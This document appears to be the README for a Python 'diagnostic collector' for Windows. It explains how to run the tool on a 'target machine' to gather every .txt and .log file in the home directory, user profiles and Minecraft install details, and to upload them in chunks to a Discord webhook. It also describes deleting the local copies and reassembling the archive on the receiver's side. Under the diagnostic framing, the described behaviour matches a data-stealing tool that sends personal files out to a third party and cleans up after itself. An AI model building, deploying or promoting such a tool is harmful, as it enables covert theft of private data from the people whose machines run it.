# Diagnostic Collector

A lightweight Windows diagnostic tool that collects system information and log files, packages them into a zip archive, splits it into chunks, and uploads everything to a Discord webhook. A companion rebuild script reassembles the archive on the receiving end.

> **Windows only** — relies on Win32 APIs (`ctypes`) for memory and disk info.

---

## Features

- **Zero dependencies** — pure Python stdlib, no `pip install` required
- **Parallel collection** — all collectors run concurrently via `ThreadPoolExecutor`
- **Smart file skipping** — ignores files over 10 MB and never re-includes previous diagnostic output
- **Chunked Discord upload** — splits archives into 7 MB chunks to stay within Discord's 8 MB limit
- **Automatic retry** — exponential back-off (up to 3 attempts) on failed uploads
- **Auto-cleanup** — deletes local files after a successful upload (configurable)
- **Manifest system** — generates a `manifest.json` so the rebuild script can reassemble chunks in the correct order
- **Self-contained rebuild** — `rebuilds.py` automatically searches multiple locations for the manifest, no path typing required

---

## Project Structure

```
diagnose/
├── github_diagnose.py   # Main collector — runs on the target machine
├── requirements.txt     # No external packages needed
└── rebuild/
    └── rebuilds.py      # Rebuild tool — runs on your machine after receiving chunks
```

---

## Requirements

- Python 3.6 or higher
- Windows OS
- A Discord webhook URL

---

## Setup

1. Clone or download this repository.
2. Open `github_diagnose.py` and set your webhook URL:

```python
WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"
```

3. Optionally adjust these config values at the top of the file:

| Variable | Default | Description |
|---|---|---|
| `CLEANUP_AFTER_SEND` | `True` | Delete local files after a successful upload |
| `VERBOSE` | `True` | Print progress logs to the terminal |
| `DISCORD_SAFE_CHUNK` | `7 MB` | Max size per uploaded chunk |
| `UPLOAD_DELAY` | `3s` | Delay between chunk uploads |
| `MAX_UPLOAD_RETRIES` | `3` | Retry attempts per chunk on failure |

---

## Usage

### Collecting Diagnostics

Run on the target Windows machine:

```bash
python github_diagnose.py
```

This will:
1. Collect system info, user profiles, and Minecraft installation details in parallel
2. Walk the user's home directory and collect all `.txt` and `.log` files under 10 MB
3. Bundle everything into a timestamped zip archive under `C:\ProgramData\WinStore\`
4. Split the zip into chunks and upload each one to the Discord webhook
5. Upload the manifest file last
6. Clean up all local files (if `CLEANUP_AFTER_SEND = True`)

**Output files** (in `C:\ProgramData\WinStore\`):

| File | Description |
|---|---|
| `system_info_{ts}.json` | Collected system data |
| `diagnostics_{ts}.zip` | Compressed archive of all files |
| `diagnostics_{ts}_part001.zip.chunk` | Upload chunk(s) |
| `manifest.json` | Index file for the rebuild script |

---

### Rebuilding the Archive

After downloading the chunk files and manifest from Discord, place them in a folder and run:

```bash
python rebuilds.py
```

Or pass the manifest path explicitly:

```bash
python rebuilds.py "C:\path\to\manifest.json"
```

`rebuilds.py` automatically searches for `manifest.json` in:
1. The current working directory
2. The same folder as `rebuilds.py`
3. `C:\ProgramData\WinStore\` (default output location)

The rebuilt zip will be saved in the same directory as the manifest.

---

## What Gets Collected

| Category | Details |
|---|---|
| **Platform** | OS name, version, release, machine type, processor |
| **CPU** | Logical core count |
| **Memory** | Total, available, used, usage percent |
| **Disks** | All mounted drives — device, total, used, free, percent |
| **Network** | Local IP addresses (non-loopback) |
| **Boot time** | Last system boot timestamp |
| **User profiles** | Usernames and paths from `C:\Users\` |
| **Minecraft** | Java Edition and Bedrock Edition install detection |
| **Log/text files** | All `.txt` and `.log` files under 10 MB in the user's home directory |

---

## Troubleshooting

**403 Forbidden from Discord**
Make sure your webhook URL is valid and the channel still exists. The script sends a proper `User-Agent` header to satisfy Discord's API requirements.

**Manifest not found**
Ensure the manifest and all chunk files are in the same folder when running `rebuilds.py`. The script will tell you exactly which locations it searched.

**Chunk missing during rebuild**
All chunk files listed in the manifest must be present before rebuilding starts. Re-download any missing chunks from Discord.

**Script exits with error in VSCode**
This is normal VSCode debugger behavior for `SystemExit`. The script completed — check the terminal output for `[OK]` or `[ERROR]` messages.
